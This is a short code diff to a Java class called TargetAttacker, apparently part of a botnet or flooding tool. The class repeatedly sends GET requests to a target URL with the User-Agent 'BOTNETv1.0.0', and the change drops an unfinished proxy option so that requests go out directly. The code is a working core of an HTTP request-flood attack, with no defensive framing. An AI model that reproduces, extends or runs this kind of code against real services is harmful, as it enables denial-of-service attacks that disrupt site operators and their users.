@@ -53,7 +53,7 @@ public class TargetAttacker implements Runnable {
     int i = 0;
     for (i = 0; i < tgt.getMaxAttempts(); i++) {
       try {
-        this.makeGetRequest(tgt.getUrl(), tgt.getProxy());
+        this.makeGetRequest(tgt.getUrl());
       } catch (IOException e) {
         e.printStackTrace();
         return;
@@ -67,16 +67,9 @@ public class TargetAttacker implements Runnable {
     }
   }
 
-  private void makeGetRequest(final String address, final String proxy) throws IOException {
+  private void makeGetRequest(final String address) throws IOException {
     URL url = new URL(address);
-    HttpURLConnection http = null;
-
-    if (proxy == null) {
-      http = (HttpURLConnection) url.openConnection();
-    } else {
-      // TODO
-    }
-
+    HttpURLConnection http = (HttpURLConnection) url.openConnection();
     http.setRequestMethod("GET");
     http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
     int response = http.getResponseCode();
